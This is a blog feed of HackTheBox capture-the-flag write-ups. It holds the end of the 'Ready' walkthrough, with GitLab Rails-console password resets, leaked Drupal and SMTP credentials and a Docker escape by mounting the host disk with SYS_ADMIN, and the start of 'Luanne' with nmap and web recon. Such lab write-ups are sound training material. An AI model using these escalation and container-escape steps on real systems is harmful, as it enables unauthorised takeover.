&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;004&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;active&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#&amp;lt;ActiveRecord::Relation [#&amp;lt;User id:3 @stbl&amp;gt;, #&amp;lt;User id:2 @pentest&amp;gt;, #&amp;lt;User id:1 @root&amp;gt;]&amp;gt;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;005&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;username&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;006&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;admin&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;created_at&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Fri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Dec&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2020&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;UTC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We see that we have a root user, who has admin right on the box. We attempt to login as &lt;em&gt;root&lt;/em&gt; in GitLab using the password we previously found. Instead, we now try to change &lt;em&gt;root&lt;/em&gt; password by using the console by running the following commands:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ippsecrocks'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ippsecrocks&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;password_confirmation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ippsecrocks'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ippsecrocks&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;021&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;save!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This grants us the admin access on GitLab, but we do not see anything initially of interest. We go back to enumerating users on the machine and find another familiar user which also has an account on GL: &lt;strong&gt;dude&lt;/strong&gt;. Using the same technique, we reset his password and proceed to login to find a repository we previously couldn’t see (or missed):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-24_03-50-16.png&quot; alt=&quot;Screenshot_2021-03-24_03-50-16&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ready-channel-enumeration&quot;&gt;ready-channel enumeration&lt;/h4&gt;

&lt;p&gt;Looking at the repository, it seems to be an installation of &lt;strong&gt;drupal&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Looking at the default credential installation, we find that it should be located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./sites/default/settings.php&lt;/code&gt; and we indeed find what appears to be a modified configuration file and a copy of the default config file; we check for difference with the default config:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;stbl@kali]─[10.10.14.232]─[~/boxes/ready/ready-channel-master/sites/default]
└──╼ &lt;span class=&quot;nv&quot;&gt;$diff&lt;/span&gt; default.settings.php settings.php                                                                                                                                             
247c247,261
&amp;lt; &lt;span class=&quot;nv&quot;&gt;$databases&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; array&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$databases&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   &lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'database'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupal'&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupaluser'&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%%cHzhNC=k9yYN!T'&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'port'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'driver'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mysql'&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'prefix'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
279c293
&amp;lt; &lt;span class=&quot;nv&quot;&gt;$drupal_hash_salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$drupal_hash_salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'txgQ6RR8KK4Q4oJRoBp-ihbXALf2tbBFLFyp9suxQxc'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And find some credentials, which we note and try against all of our known services for dude and root, but none works.&lt;/p&gt;

&lt;h4 id=&quot;enumerating-files&quot;&gt;Enumerating files&lt;/h4&gt;

&lt;p&gt;Going through the &lt;strong&gt;linpeas&lt;/strong&gt; results, we did not find any solid track to follow, so instead we turn toward manual enumeration of suspicious files on the system. Our starting point lies on the fact that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root_pass&lt;/code&gt; file was created on &lt;strong&gt;June 29, 2020&lt;/strong&gt;, so we decide to go after the files created ever since with the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-path&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/sys*&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-path&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/proc/*&quot;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-newermt&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'6/29/2020 0:00:00'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--full-time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/|/opt/gitlab/embedded|/opt/gitlab/sv/|/shm/'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 2- | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; |uniq &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 9 | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The command explained:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;First we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; in order to find:
    &lt;ul&gt;
      &lt;li&gt;&lt;em&gt;! -path “/sys&lt;/em&gt;” ! -path “/proc/&lt;em&gt;”&lt;/em&gt; : excluding directories sys and proc (system was a bit slow, so we excluded here instead of with grep)&lt;/li&gt;
      &lt;li&gt;&lt;em&gt;-type f&lt;/em&gt;: “files” type of files.&lt;/li&gt;
      &lt;li&gt;&lt;em&gt;-newermt ‘6/29/2020 0:00:00’&lt;/em&gt;: files newer than the date we mentioned above.&lt;/li&gt;
      &lt;li&gt;&lt;em&gt;-exec ls -la –full-time {} \;&lt;/em&gt; execute ls on the found files and report result. We also include the full-timestamp with &lt;em&gt;–full-time&lt;/em&gt; so we are more easily able to identify which files were system modified or user-modified by looking at the nanoseconds&lt;/li&gt;
      &lt;li&gt;&lt;em&gt;2&amp;gt;/dev/null&lt;/em&gt; redirect stderr to dev/null&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Then we exclude a bunch of additional patterns which contained non-interesting and install related files with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -vE&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cut -d'.' -f 2- &lt;/code&gt; cut all the results by ‘.’ so we keep only the nanoseconds and the file names.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sort&lt;/code&gt; once.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uniq -c -w 9&lt;/code&gt;  to count (and prefix) the unique occurrence while only waking the 9 first characters into consideration. Main motivation behind this is to weed out cases where we have more than one occurrence of a file being saved exactly at the same time, which would suggest system-generated files versus human intervention.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This yields a pretty narrowed-down list of files to look into:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-30_00-32-10.png&quot; alt=&quot;Screenshot_2021-03-30_00-32-10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The three files in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backup/&lt;/code&gt; folder so sounds promising, so look into those:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;docker-compose.yml&lt;/em&gt; contains settings about the docker-compose used to get the container going; we do find a redis instance running there and do basic enumeration on it, but find nothing of interest.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;gitlab-secrets.json&lt;/em&gt; is mostly secret/public/private keys. We leave that alone for now.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;gitlab.rb&lt;/em&gt; contains a bunch of commented our configuration parameters, however we do find one that isn’t:&lt;/p&gt;

    &lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;gitlab_rails&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'smtp_password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;wW59U!ZKMbG9+*#h&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;We try this new password for &lt;strong&gt;root&lt;/strong&gt; on the machine and are now able to get root on the docker container.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;root-docker-to-root-host&quot;&gt;root (docker) to root (host)&lt;/h3&gt;

&lt;p&gt;Now that we have a user with more privilege, we enumerate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt; folder in search of the flag, but find nothing; this suggests that we need to go up a level and access the host, so we look into common &lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout&quot;&gt;breakout methods from hacktricks&lt;/a&gt; and try to look for our current capabilities using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capsh --print&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-30_01-10-47.png&quot; alt=&quot;Screenshot_2021-03-30_01-10-47&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the capability we have that seem to grant us an easy access on the host system is the &lt;strong&gt;SYS_ADMIN&lt;/strong&gt; one, which allows us to mount filesystems, which we can then exploit to mount the host itself:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fdisk &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
mount /dev/sda2 /mnt/foo/
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/foo
&lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt; ./ bash
root@gitlab:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt 
b7f98681505cd39066f67147b103c2b3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And thus, we gain the 🏴 root flag 🏴 of ready.&lt;/p&gt;

&lt;h1 id=&quot;hindsight--after-thoughts&quot;&gt;Hindsight &amp;amp; After-Thoughts&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Easy foothold and final root escalation; this was all in the enumeration for me.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Looking into the GitLab users turned out to be a complete honey-pot. Did not gain relevant info from this, unless there was another intended way.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Box was a bit confusing at times, probably due to the multiple users on it at the same time updating passwords and all.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><category term="htb" /><summary type="html"></summary></entry><entry><title type="html">HTB Writeup - Luanne</title><link href="/posts/HTB-Writeup-Luanne" rel="alternate" type="text/html" title="HTB Writeup - Luanne" /><published>2021-03-18T19:36:34+01:00</published><updated>2021-03-18T19:36:34+01:00</updated><id>/posts/HTB-Writeup:-Luanne</id><content type="html" xml:base="/posts/HTB-Writeup-Luanne">&lt;p&gt;&lt;img src=&quot;/assets/images/7a4a9e4198292175421007edb1724a11.png&quot; alt=&quot;7a4a9e4198292175421007edb1724a11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is one of my first few writeup for HTB boxes, starting with Luanne, a NetBSD box completed on March 17 2021.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; I am in no way an expert in the matter, been learning netsec and pentesting on the side by doing these boxes on HTB and watching an obscene amount of IppSec videos. What I am writing is simply my though process and might not be the most optimal solution. In fact, I try to write in the order I did everything, so you might see me bouncing back and forth between services.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;p&gt;We start with the standard &lt;strong&gt;&lt;em&gt;nmap&lt;/em&gt;&lt;/strong&gt; scan on 10.10.10.218:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/luanne 10.10.10.218
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We get the following results:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Mon Mar 15 19:29:27 2021 as: nmap -sV -sV -oA nmap/luanne 10.10.10.218
Nmap scan report for 10.10.10.218
Host is up (0.027s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
80/tcp   open  http    nginx 1.19.0
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 15 19:29:45 2021 -- 1 IP address (1 host up) scanned in 18.10 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We see that this box is NetBSD based, (which will be a challenge; never done any BSD machine) with open ports ssh - 22, http (ngnix) - 80 and http (Medusa?) - 9001.&lt;/p&gt;

&lt;p&gt;Let’s start with the web service.&lt;/p&gt;

&lt;h3 id=&quot;web-recon---80&quot;&gt;Web Recon - 80&lt;/h3&gt;

&lt;p&gt;Accessing http://10.10.10.218, we get an &lt;em&gt;.htpasswd&lt;/em&gt; style authentication:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-15_19-34-19.png&quot; alt=&quot;Screenshot_2021-03-15_19-34-19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We give a few default combinations a try (admin:admin, guest:guest, etc), but nothing. We do notice however that on a 401 - Unauthorised error, we get a message about http://127.0.01:3000, hinting at some service listening locally. Then we check for any robots.txt files and do happen to find something:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: *
Disallow: /weather  #returning 404 but still harvesting cities 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before going any further, we start a recon with &lt;strong&gt;&lt;em&gt;gobuster&lt;/em&gt;&lt;/strong&gt; on both the root of the service and on this newly found &lt;em&gt;/weather&lt;/em&gt; directory. The dictionary I generally use for &lt;strong&gt;&lt;em&gt;gobuster&lt;/em&gt;&lt;/strong&gt; would be the raft-small-words.txt from the excelent &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;SecList&lt;/a&gt; repo.&lt;/p&gt;

&lt;p&gt;In the meantime, we go check the second web service over at http://10.10.10.218:9001.&lt;/p&gt;

&lt;h3 id=&quot;web-recon---9001&quot;&gt;Web Recon - 9001&lt;/h3&gt;

&lt;p&gt;Accessing the second service, we see a similar http authentication:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-15_21-50-06.png&quot; alt=&quot;Screenshot_2021-03-15_21-50-06&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unlike the first service however, we do see the mention of “default” in the auth message. At this point we researched a bit more into what “Medusa”, which is part of the &lt;strong&gt;Supervisor&lt;/strong&gt;  system which monitors UNIX-like processes.&lt;/p&gt;

&lt;p&gt;Given the “default” mention above, we try a few default credentials set, but with no success. &lt;strong&gt;&lt;em&gt;searchsploit&lt;/em&gt;&lt;/strong&gt; also shows the service has a RCE Metasploit module available, but for &lt;em&gt;authenticated&lt;/em&gt; users and versions &lt;em&gt;3.0a1 &amp;lt; 3.3.2&lt;/em&gt;, and we do not know the version yet.&lt;/p&gt;

&lt;p&gt;At this point we go back to the first web server to review our gobuster results.&lt;/p&gt;

&lt;h3 id=&quot;web-recon---80-contd--api&quot;&gt;Web Recon - 80 (contd.) &amp;amp; API&lt;/h3&gt;

&lt;p&gt;We find that gobuster found a new path: &lt;em&gt;/weather/forecast&lt;/em&gt;. Navigating to this page, we see what looks like to be a API route endpoint, as Firefox beautiful parses it (I admit, I was a bit confused at first):&lt;/p&gt;

